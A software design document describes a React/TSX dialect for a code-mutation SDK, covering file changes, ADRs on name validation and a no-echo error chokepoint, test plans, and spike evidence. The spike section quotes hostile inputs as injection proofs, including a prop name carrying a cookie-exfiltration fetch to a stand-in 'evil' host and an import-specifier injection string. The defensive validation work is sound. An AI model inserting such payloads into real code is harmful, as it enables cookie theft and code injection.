# Design: React (TSX/JSX) Dialect (react-dialect)

**Triage**: L (sensitivity override: security code-execution HIGH) · **Spec**: V4 signed · **Status**: ok
**Architecture impact**: additive · **Revision**: 2 (council synthesis: architect + security + tech-writer; spec V2→V4 deltas absorbed)

## 4.1 Architecture Overview

A new dialect leaf `src/dialects/react/{ast,ops,index}.ts` mirrors the shipped `typescript`
leaf exactly: `ast.ts` is the sole ts-morph importer (virtual `.tsx` path + `jsx`
compilerOption), `ops.ts` holds the two v1 ops, `index.ts` exposes `find()` and composes the
op-pack via the generic `withOps`/`defineDialect`/`createDialectHandle` seam — which needs
**zero change** (confirmed generic; coalescing, containment, path-channel all dialect-agnostic).
Three kit-internal seams are new: a synchronous basename-scoped `.tsx` gate at the exported
`find()` (V4: extensionless basenames REJECT); a library-agnostic name-validation module
`src/core/jsx-name-validator.ts` exposing grammars plus a `validatedOp` higher-order guard (the
single validate-before-mutate chokepoint); and `src/core/reject-tail.ts`, the no-echo
message-tail chokepoint every react reject routes through. The fidelity-glue primitives are
**duplicated** into `react/ast.ts`, not hoisted (ADR-01, accepted by council) — the change stays
purely additive, and two NEW repo-wide fitness functions now guard the boundary that ruling
protects (core/commons AST-free; parser-construction confinement).

## 4.2 File Changes

| Path | Action | Purpose |
|---|---|---|
| `src/dialects/react/ast.ts` | Create | ts-morph `.tsx` parse/print; own copy of BOM/newline/frozen-settings/syntactic-throw glue (ADR-01) |
| `src/dialects/react/ops.ts` | Create | `setJsxProp` + react `addImport`, each wrapped in `validatedOp` (ADR-02/05) |
| `src/dialects/react/index.ts` | Create | `find()` + synchronous basename gate (incl. V4 extensionless reject) + op-pack composition |
| `src/core/jsx-name-validator.ts` | Create | three per-arg grammars + frozen 3-name denylist `Set` + `validatedOp` wrapper (ADR-02) |
| `src/core/reject-tail.ts` | Create | `nameRuleTail(argName, ruleLabel)` + `boundedFragment(s, 16)` — no-echo tail chokepoint (ADR-02) |
| `test/dialects/react/dialect.test.ts` | Create | fidelity, Tsx-engagement divergence, extension gate (.1–.5, .8–.10), targeting trio, placement, closing-form |
| `test/dialects/react/ops.test.ts` | Create | value grammar (3 forms) + upsert; `addImport` merge/create/idempotent/named-only; value-verbatim trust |
| `test/dialects/react/ops-exact-set.test.ts` | Create | exact 2-op set `toEqual` (anti-smuggle) |
| `test/dialects/react/name-validation.test.ts` | Create | hostile battery + 3-name denylist, widened names, load-bearing raw-splice proofs, zero-emit/byte-unchanged, Set-key-safety scan |
| `test/dialects/react/docs.test.ts` | Create | REQ-RXD-09 doc guard via pinned anchor sentinels (trust + spread + explicit-extension) |
| `test/dialects/react/golden/*.txt` | Create | ~20 committed byte-exact goldens (placement/value/coalescing/corpus) |
| `test/conformance/react-conformance.test.ts` | Create | `testDialect`/`testOpPack`; 20-sample JSX corpus + 6 mandatory; heterogeneous coalescing |
| `test/fitness/dts-baseline/react.index.d.ts` | Create | FIT-04 first `./react` .d.ts baseline (pins `find` JSDoc incl. trust line) |
| `test/fitness/fit-36-spike-deps-absent.test.ts` | Create | REQ-RXD-14 manifest+lockfile scan for spike libs |
| `test/fitness/fit-37-core-commons-ast-free.test.ts` | Create | NEW FF: `src/core/**` + `src/commons/**` import zero AST libraries (guards ADR-01's boundary) |
| `test/fitness/fit-38-parser-construction-confinement.test.ts` | Create | NEW FF: `new Project(` appears ONLY in dialect `ast.ts` files (retro-covers TS dialect) |
| `package.json` | Modify | add `./react` export (6th subpath) |
| `test/fitness/pkg-surface-baseline.json` | Modify | FIT-14 regen (`./react` export + `dist/dialects/react/**` tarball) |
| `test/fitness/fit-09-pkg-exports-resolution.test.ts` | Modify | exact list 5→6 + `./react` case |
| `test/fitness/fit-14-package-surface.test.ts` | Modify | two exact-5→6 assertions |
| `test/fitness/fit-04-dts-semver-gate.test.ts` | Modify | add react DTS pair to `DTS_PAIRS` |
| `test/e2e/installed-consumer.e2e.test.ts` | Modify | `./react` probe on tarball + bun-link legs (REQ-LC) |
| `test/security/canary-no-echo.test.ts` | Modify | react name-validator canary case (REQ-RXD-13.1) |
| `docs/authoring-a-dialect.md` | Modify | two-dialect reframe + react worked example + pinned-sentinel trust/spread/extension sections |
| `README.md` | Modify | line-12 example gains `@pbuilder/sdk/react` (minimal; no new section — REQ-RXD-09 scopes docs) |
| `src/dialects/typescript/ast.ts` | Read-only | reference for the duplicated glue; NOT modified (ADR-01) |
| `src/core/{dialect-handle,define-dialect,dialect-error}.ts` | Read-only | generic seam reused, zero change; RXD-13.2 rides on its machinery |
| `test/fitness/fit-02-dialect-leaf-rule.test.ts` | Read-only | auto-covers the react leaf, zero edit |

## 4.2b Flow Changes

| Flow | Action | REQ-IDs | E2E spec | Notes |
|---|---|---|---|---|
| Author mutates a `.tsx`/JSX file via `@pbuilder/sdk/react` | Create | REQ-RXD-01..14, REQ-LC-01..03 | `test/e2e/installed-consumer.e2e.test.ts` (extend: `./react` probe both legs) | net-new capability — the file was unopenable before; e2e proves the subpath resolves & runs post-pack/bun-link |

## 4.2c Architecture Touchpoints

| Layer/Component | Action | Why | Baseline fit |
|---|---|---|---|
| `src/dialects/react` (new leaf) | new | mirrors `typescript` leaf; 2nd ts-morph importer under `src/dialects/**` | aligns |
| `src/core/jsx-name-validator.ts` + `src/core/reject-tail.ts` | new | library-agnostic kit helpers, no barrel (dialect-error/deep-equal precedent) | aligns |
| `package.json#exports` (`./react`) | extend | 6th public subpath, mirrors `./typescript` | aligns |
| FIT-04/09/14 baselines + assertions; NEW fit-36/37/38 | modify/new | mechanical +1 subpath / regen; two new repo-wide guards (test-side only) | aligns |
| `test/e2e/installed-consumer` | modify | `./react` probe both legs | aligns |
| `docs/authoring-a-dialect.md` + `README.md` | extend | second worked example; line-12 touch | aligns |
| `src/core/{dialect-handle,define-dialect}` seam | none | generic coalescing/composition reused, zero change | aligns |

All rows `aligns`; no `deviates` → no touchpoint forces an ADR. ts-morph reachability widens
additively from one dialect leaf to two — the "new dialect → own leaf" convention, not a
boundary change. fit-37/38 codify (do not alter) the existing boundary.

## 4.3 Data Model

No data-store or schema change. `Ast = SourceFile` (ts-morph), unchanged frozen shape. A
module-private `WeakMap<SourceFile, boolean>` in `react/ast.ts` remembers BOM presence. The
denylist is a module-level frozen
`ReadonlySet<string> = new Set(["__proto__", "constructor", "prototype"])` checked via `.has()`
equality (V4), never an object literal, never regex-encoded.

## 4.4 Interface Contracts

```ts
// src/dialects/react/ast.ts
export function parse(source: string): SourceFile;   // virtual "dialect-source.tsx", jsx:react; throws on syntactic diagnostics
export function print(ast: SourceFile): string;      // getFullText() + BOM re-prepend

// src/core/jsx-name-validator.ts (library-agnostic; kit-internal, no barrel)
export const JSX_NAME_DENYLIST: ReadonlySet<string>; // frozen {__proto__, constructor, prototype}, .has() equality
export function assertValidAttributeName(propName: string): void;   // ^[A-Za-z_][A-Za-z0-9_-]*(:[A-Za-z_][A-Za-z0-9_-]*)?$ + denylist
export function assertValidElementName(elementName: string): void;  // member/namespaced/hyphenated JSX-name + denylist (lookup-only)
export function assertValidImportBinding(name: string): void;       // ^[A-Za-z_$][A-Za-z0-9_$]*$ + denylist
// The single validate-before-mutate chokepoint (ADR-02): mutation code lives INSIDE body and
// structurally cannot run before every declared arg validates.
export function validatedOp<Ast, A extends unknown[]>(
  validators: (args: A) => void,   // runs the assertValid* set for this op's args
  body: (ast: Ast, ...args: A) => void
): (ast: Ast, ...args: A) => void;

// src/core/reject-tail.ts (kit-internal, no barrel) — the no-echo tail chokepoint
export function nameRuleTail(argName: string, ruleLabel: string): string; // default ZERO value echo
export function boundedFragment(s: string, cap?: number): string;         // 16-char ceiling, rarely used

// src/dialects/react/ops.ts — both exported ops are validatedOp-wrapped
export function setJsxProp(ast: SourceFile, elementName: string, propName: string, value?: string): void;
export function addImport(ast: SourceFile, name: string, from: string): void;

// src/dialects/react/index.ts
type ReactOps = { setJsxProp: ...; addImport: ... };
export function find(path: string): Handle<"found", SourceFile, ReactOps>;
```

**`find()` gate (V4, basename-scoped, synchronous)**: classify `basename(path)` before
delegating — (1) suffix `.tsx` → pass; (2) basename contains NO dot (directory dots don't
count: `src/v1.2/Button` is extensionless) → reject naming the explicit-`.tsx` requirement +
"append `.tsx`" fix (REQ-RXD-02.9/.10); (3) basename has a dot, suffix ≠ `.tsx` → V2 tails
unchanged (`.ts`→typescript dialect; `.jsx`→v1-unsupported + catalog follow-up; else→"only
`.tsx`"; dotfile `.babelrc` and trailing-dot `Button.` resolve through this suffix rule,
REQ-RXD-02.8). Throws `dialectError` synchronously — path echo allowed (bounded); `find`'s
JSDoc notes gate rejects carry the standard `dialect operation failed:` prefix.

**`setJsxProp` order** (inside `validatedOp` body, after elementName+propName validate):
match trio by tag-text equality (0→reject, 1→mutate, N→reject naming count); upsert via the
structured API (ADR-03) — `getAttribute` hit → `setInitializer(value)` / `removeInitializer()`
(omitted → boolean shorthand); miss → `addAttribute({ name, initializer: value })`. `value` is
NOT validated (REQ-RXD-11/12 verbatim). **Set-key-safety (ADR-02 clause)**: `propName`/
`elementName` are NEVER plain-object keys anywhere in validator/targeting — Set/Map/`===` only.

**Error-message catalog (tech-writer adopted, two-remedy shape, zero hostile echo)**: every
react reject tail names the ARGUMENT + RULE + a remedy pair (fix the name / use `.modify()`),
built via `nameRuleTail`. Denylist rejects MAY echo the fixed literal (`__proto__` etc. — it IS
the rule's vocabulary, not author data). The TS dialect's `assertNoCollision` full-`"${name}"`-
echo pattern (unbounded length, no chokepoint) is structurally unreachable from react paths —
every react reject routes through `src/core/reject-tail.ts`'s helpers, by construction.

**Amended post-council ARCH-3**: match-count rejects (REQ-RXD-04) are the ONE react reject class
that echoes a POST-VALIDATION argument value (`elementName`) rather than refusing to — deliberate
UX (naming which element was not found/matched). The original wording here claimed react tails
"never interpolate author values... by construction", which was FALSE as written: `ops.ts` called
`dialectError` directly with `` `${elementName}` `` interpolated, bypassing the tail chokepoint
entirely (confirmed: `rg "reject-tail"` found exactly one importer, `jsx-name-validator.ts` — the
op layer never routed through it). The security property was never at risk (`elementName` is
post-validation, grammar-constrained: no quotes, no newlines) — what was actually missing was a
LENGTH bound, since `ELEMENT_NAME_GRAMMAR` has no length ceiling. Fixed by routing both call
sites through NEW `reject-tail.ts` helpers, `zeroMatchTail`/`multiMatchTail`, which apply
`boundedFragment` to `elementName` the same way a hostile-value diagnostic fragment would. The
accurate claim, now true of the code: every react reject — including the match-count class —
routes through a `reject-tail.ts` helper, and every echoed value (denylist literals, bounded
`elementName` fragments) is LENGTH-bounded; only match-count rejects echo a value at all, and
only because REQ-RXD-04 requires naming the element.

**RXD-13.2 machinery (cited for Test Derivation)**: a `validatedOp` throw before `body` rides
`dialect-handle.ts`'s existing `runOp` → `#invokeContained` (brand rethrow) → `#ensureOpen`
never reached → zero directives + byte-unchanged file; `RunContext.runFailure` poison-flags the
chain fail-closed. No new containment code is written — the tests assert this existing seam.

## 4.5 ADRs

### ADR-01: Fidelity glue — DUPLICATE in the react leaf, not hoist to core
**Status**: Accepted (council-ratified rev 2)
**Context**: `typescript/ast.ts`'s four ts-morph-determined primitives (BOM WeakMap re-prepend,
`detectNewLineKind`, frozen `ManipulationSettings`, syntactic-diagnostic throw) are identical
for `.tsx`. The stage-5 lesson said "hoist when the second dialect lands."
**Decision**: Duplicate the four primitives into `react/ast.ts`; `typescript/ast.ts` untouched.
No shared core module. The boundary this protects is now GUARDED, not conventional: fit-37
(core/commons AST-free) and fit-38 (parser-construction confinement — `new Project(` only in
dialect `ast.ts` files, retro-covering `typescript/ast.ts:73`) ship with this change.
**Consequences**:
- (+) ts-morph stays leaf-isolated (baseline Note 2); shipped sensitive dialect untouched; impact stays `additive`.
- (−) ~40 lines duplicated; drift NOT silent (both leaves ship BOM/CRLF goldens + mandatory corpus — a ts-morph upgrade divergence fails RED in both).
- Followup (Archive Commitments): when dialect #3 arrives, the hoist target is a PEER module (e.g. `src/ts-morph-support/`) — outside core AND outside `src/dialects/**` (ADR-0009 kit boundary; FIT-02 would flag a `dialects/_shared`) — so the future hoist doesn't re-litigate the home.
**Alternatives**: *Hoist to `src/core/`* — rejected: imports ts-morph into AST-agnostic core.
*`src/dialects/_shared`* — rejected: FIT-02 treats every `dialects/*` dir as a dialect → RED.

### ADR-02: Name validation — core-resident grammars + `validatedOp` chokepoint + no-echo tail helper
**Status**: Proposed (rev 2: absorbs validatedOp, reject-tail, Set-key-safety, V4 denylist)
**Context**: ts-morph writes attribute names/initializers as RAW TEXT (spike legs b/e2:
hostile `propName` AND hostile `addImport.name` splice raw through the structured API) — the
validator is load-bearing. Three loose predicates called by convention leave order/coverage to
discipline; the TS dialect's `assertNoCollision` full-echoes `"${name}"`, a copy-paste hazard
onto react reject paths under the ADR-01 duplicate posture.
**Decision**: `src/core/jsx-name-validator.ts` (kit-internal, no barrel) ships the three
grammars, the frozen V4 denylist `Set(["__proto__","constructor","prototype"])` (`.has()`
equality, both name args, never regex-encoded), and `validatedOp` — ops' mutation code lives
INSIDE `body`, structurally unreachable before validation. `src/core/reject-tail.ts` ships
`nameRuleTail`/`boundedFragment`; every react reject tail routes through it — default ZERO
value echo (16-char `boundedFragment` is a ceiling, not a norm). **Set-key-safety clause**:
`propName`/`elementName` never used as plain-object keys (no `record[name]`, `{[name]:…}`,
`counts[tag]++`) anywhere in validator/targeting — Set/Map/equality only; this, not denylist
width, is the real Stage-4b `__proto__` defence; pinned by test.
**Consequences**: (+) one chokepoint collapses REQ-RXD-06 + RXD-13 enforcement; copy-paste of
the TS echo pattern prevented by construction; shareable by future dialects. (−) only wired to
react in v1 (TS retrofit = pending item 22); `validatedOp` adds one indirection per op.
**Alternatives**: *Three loose predicates by convention* — rejected: validate-then-mutate
ordering left to discipline in a HIGH sensitivity area. *Single shared regex* — rejected by
spec. *Validator inside `react/ops.ts`* — rejected: couples a reusable control to one leaf.

### ADR-03: `setJsxProp` mutation via the ts-morph structured API (no text-splice fallback)
**Status**: Proposed
**Context**: The spike-gate obligation required proving `JsxAttribute` set/add byte-exact
across the corpus under real mutation before committing a mechanism.
**Decision**: `addAttribute` / `setInitializer` / `removeInitializer`. Spike-proven byte-exact
on every corpus class (fragments, spreads, namespaced attrs, comments-in-JSX, `<br />`, CRLF,
BOM, multi-line, `<Menu.Item/>`, 4 MiB). No text-splice fallback needed.
**Consequences**: (+) minimal, structured, near-zero diff from the proven pattern; boolean
shorthand + after-spread insertion fall out for free. (−) ts-morph appends an inserted
attribute onto the LAST attribute's line with a single space — for a multi-line element the new
attribute does NOT get its own line. Spec-consistent (REQ-RXD-10.1 pins a universal
single-space separator, no reflow) and captured verbatim in the committed multi-line golden.
**Alternatives**: *`magic-string`/computed text-splice* — rejected: unnecessary given
structured fidelity holds; hand-rolls every future op's insertion math.

### ADR-04 (record): exports-guard minimal edit + row-229 reaffirm
**Status**: Proposed · Only the mechanical XS edits land (FIT-09 exact list 5→6, FIT-14/FIT-04
baseline regens). The extensibility refactor (row 229) stays DEFERRED; trigger updated at
archive to "dialect #3 / next subpath addition."

### ADR-05 (record): react `addImport` — fresh-write, validated, structured-path NON-NEGOTIABLE
**Status**: Proposed (rev 2: structured-path clause + empirical pins)
Ops-axis is duplicate. React's `addImport` is written fresh, `validatedOp`-wrapped on `name`
(the shipped TS op validates nothing — retrofit is pending item 22), and MUST go through
`addImportDeclaration({moduleSpecifier, namedImports})` / `addNamedImport` — the structured
path is what escapes `from`; a string-concat "optimization" reopens SEC-3 + SEC-4
simultaneously. Empirically pinned (spike legs e/e2, ts-morph@28): hostile `from`
(`a"; import {y} from "evil`) emits ONE escaped string literal — reparse sees exactly 1
ImportDeclaration whose specifier value is the full hostile string; hostile `name` BYPASSING
validation splices raw (reparse sees 2 declarations) — proving the validator load-bearing for
this op too. The regression tests re-pin both permanently (REQ-RXD-06.3/.4).

## 4.6 Test Derivation

| REQ-ID | Scenarios | Level | Test |
|---|---|---|---|
| REQ-RXD-01 | .1 exact 2-op set | unit | `ops-exact-set.test.ts` |
| REQ-RXD-02 | .1–.5, .8 dotfile/trailing-dot, .9 extensionless reject, .10 directory-dots (V4; .6/.7 retired) | unit | `dialect.test.ts` |
| REQ-RXD-03 | .1–.5 fidelity + Tsx-engagement divergence | unit | `dialect.test.ts` |
| REQ-RXD-04 | .1–.6 targeting trio + upsert + member name | unit | `ops.test.ts` / `dialect.test.ts` (goldens) |
| REQ-RXD-05 | .1–.4 merge/create/idempotent/named-only | unit | `ops.test.ts` |
| REQ-RXD-06 | .1–.6 per-arg validation; .5 battery × {__proto__, constructor, prototype} both name args (V4); .3/.4 empirical splice/escape pins | unit(sec) | `name-validation.test.ts` |
| REQ-RXD-07 | .1 heterogeneous coalescing → one modify | integration | `react-conformance.test.ts` (testOpPack) |
| REQ-RXD-08 | .1–.2 corpus + op-pack fidelity | integration | `react-conformance.test.ts` |
| REQ-RXD-09 | .1–.5 doc guard incl. explicit-extension (V4) via pinned anchor sentinels | architectural | `docs.test.ts` |
| REQ-RXD-10 | .1–.6 placement/whitespace/closing-form | unit | `dialect.test.ts` (goldens) |
| REQ-RXD-11 | .1–.5 value grammar 3 forms + upsert-across-form | unit | `ops.test.ts` (goldens) |
| REQ-RXD-12 | .1 hostile value emitted verbatim | unit(sec) | `ops.test.ts` |
| REQ-RXD-13 | .1 canary; .2 zero-emit/byte-unchanged riding runOp→#invokeContained→poison-flag (cited §4.4); .3 no-unbounded-echo | unit(sec) | `name-validation.test.ts` + `canary-no-echo.test.ts` (.1) |
| REQ-RXD-14 | .1 spike libs absent | architectural | `fit-36-spike-deps-absent.test.ts` |
| REQ-LC-01 | .1–.2 bun-link 6 subpaths | e2e | `installed-consumer.e2e.test.ts` |
| REQ-LC-02 | .1–.3 bun-link founding-bug parity | e2e | `installed-consumer.e2e.test.ts` |
| REQ-LC-03 | .1 tarball `./react` probe | e2e | `installed-consumer.e2e.test.ts` |
| — (FF) | Set-key-safety static scan of validator+react leaf | architectural | `name-validation.test.ts` |
| — (FF) | core/commons AST-free; parser-construction confinement | architectural | `fit-37`/`fit-38` |

Every V4 REQ-ID/scenario covered (retired .6/.7 correctly absent); the Create flow (4.2b) gains
e2e rows via REQ-LC-01..03. Strict TDD: all goldens/assertions authored failing-first.

## 4.7 Fitness Functions

- FIT-02 / FIT-01: auto-cover the new leaf, zero edit.
- FIT-04/09/14: mechanical +1 subpath / new .d.ts pair / baseline regen.
- NEW exact-op-set test (`toEqual` anti-smuggle).
- NEW `fit-36-spike-deps-absent`: manifest + lockfile scan for `@babel/parser`,
  `@babel/generator`, `recast`, `magic-string`; `dependencies` stays exactly `{ts-morph}`.
- NEW `fit-37-core-commons-ast-free` (architect adoption): `src/core/**` + `src/commons/**`
  import zero AST libraries — the boundary ADR-01 refused to breach was previously UNGUARDED.
- NEW `fit-38-parser-construction-confinement` (architect adoption): `new Project(` appears
  ONLY in `src/dialects/*/ast.ts` — repo-wide, retro-covers the TS dialect.
- JSX adversarial corpus gate via `testDialect`/`testOpPack` (REQ-RXD-08, required capability).
- Set-key-safety scan (ADR-02 clause) inside `name-validation.test.ts`.

## 4.8 Migration / Rollout

No migration. Additive: new subpath, new leaf, two new kit-internal core files, three new
fitness files. Rollback = delete `src/dialects/react/**`, `src/core/jsx-name-validator.ts`,
`src/core/reject-tail.ts`, `test/dialects/react/**`, fit-36/37/38; revert the `./react` export,
FIT-04/09/14 baselines, doc/README edits (all git-tracked). `typescript/ast.ts` untouched — its
goldens verify no regression.

## 4.9 Performance

None significant. 4 MiB TSX round-trip measured ~200 ms (same ballpark as the shipped `.ts`
dialect's 4 MiB sample); parse-per-`find` unchanged from the proven pattern.

## 4.10 Architecture Impact

**Architecture impact**: additive
**Rationale**: every Architecture Touchpoint (4.2c) is `aligns` — a new dialect leaf joining
`src/dialects/**`, two new library-agnostic core helpers (dialect-error/deep-equal precedent),
a 6th subpath mirroring `./typescript`, and test-side-only fitness additions (fit-37/38 codify
an EXISTING boundary, they don't move one). No existing boundary modified; no shipped module
changes behaviour (ADR-01 keeps `typescript/ast.ts` untouched). Confirms the proposal's
fallback branch (duplicate-now → `additive`); the deliberate hoist (peer-module home) is a
registered followup. Rev-2 deltas (validatedOp, reject-tail, V4 gate/denylist, two FFs) are all
inside the new leaf, new kit-internal helpers, or tests — the A3 derivation is unchanged.

## Documentation Plan (tech-writer adopted)

- **JSDoc checklist**: `find` — tsx-only + sync gate + extensionless reject + forward-compat
  rationale (REQ-RXD-09.5) + one trust line + `@example` + a note that gate rejects carry the
  standard `dialect operation failed:` prefix. `setJsxProp` — upsert → single-match trio →
  placement (incl. spread-wins-at-runtime rationale) → three value forms → REQ-RXD-12 sentence
  verbatim. `addImport` — merge-or-create, idempotent, NAMED-ONLY + catalog pointer, validates
  `name` stated POSITIVELY (never advertise the TS op's laxity).
- **Trust-boundary placement (security correction)**: `setJsxProp`'s JSDoc does NOT reach the
  public `.d.ts` (the `OpMethods` mapped type strips it — only `find` emits), so FIT-04 cannot
  pin op JSDoc. The PINNED controls are (a) the trust line in `find`'s JSDoc (FIT-04-covered
  via `react.index.d.ts`) and (b) the doc-guard sections; `setJsxProp`'s full REQ-RXD-12 JSDoc
  ships for contributors but is not counted as a guarded control.
- **Doc surgery** (`docs/authoring-a-dialect.md`): two-dialect intro reframe (kills "the first
  real dialect … five structured ops", REQ-RXD-09.4); react subsection with the coalesced
  `addImport`+`setJsxProp` worked example in `// ->` form; **pinned anchor sentinels** — the
  value-trust and spread-precedence sections each share a verbatim heading + sentence with
  `docs.test.ts`'s guard so doc and guard cannot drift independently; explicit-extension
  requirement + `.jsx` forward-compat reason (REQ-RXD-09.5).
- **README**: line-12 example gains `@pbuilder/sdk/react` only; NO new dialect section.
- **Terminology**: author-facing text says "prop"; "attribute" reserved for grammar/injection
  rationale.

## Spike Evidence (BLOCKING gate — run this session, ts-morph@28.0.0, scratchpad)

- **(a) `JsxAttribute` set/add byte-exactness under real mutation**: PASS across the full corpus
  (append-after-last, after-spread, in-place update, self-closing, paired, comments-in-JSX,
  `<br />`, `<Menu.Item/>`, CRLF, BOM, string/expr/boolean value forms, widened `data-testid`/
  `aria-label`/`xlink:href`, 17/17 round-trip corpus, 4 MiB byte-exact ~200 ms). The one initial
  "fail" (multi-line element) was a wrong spike expectation, not a mechanism fault: ts-morph
  appends onto the last-attribute line with a single space — exactly REQ-RXD-10.1's universal
  single-space contract, all other lines byte-identical. Corrected golden CONFIRMED byte-exact.
  → structured API is the mechanism; no fallback (ADR-03).
- **(b) unvalidated hostile propName**: SPLICES RAW — `setJsxProp("Button",
  'onError={fetch("//evil/"+cookie)}', "{x}")` printed
  `<Button onError={fetch("//evil/"+cookie)}={x} />`. Validator is LOAD-BEARING (ADR-02).
- **(c) REQ-RXD-03.5 angle-bracket cast**: DIVERGES — `const x = <string>y;` yields 2 syntactic
  diagnostics under `ScriptKind.Tsx` vs 0 under `.ts`. Reject scenario HOLDS; Tsx mode proven
  live. NO spec amendment needed. (Generic-arrow `<T,>` round-trips byte-exact.)
- **(d) boolean shorthand (omitted value)**: PASS — bare `<Input required />` via
  `addAttribute({ name, initializer: undefined })`.
- **(e) SEC-4 from-escaping pin (rev 2, council-requested)**: hostile `from`
  (`a"; import {y} from "evil`) through `addImportDeclaration` emits ONE escaped string
  literal; reparse sees exactly 1 ImportDeclaration, specifier value = the full hostile string,
  no `"evil"` import. **(e2)** hostile `name` bypassing validation through `namedImports`
  splices RAW — reparse sees 2 ImportDeclarations — proving the validator load-bearing for
  `addImport` too (ADR-05).

## 4.11 Open Questions

None.
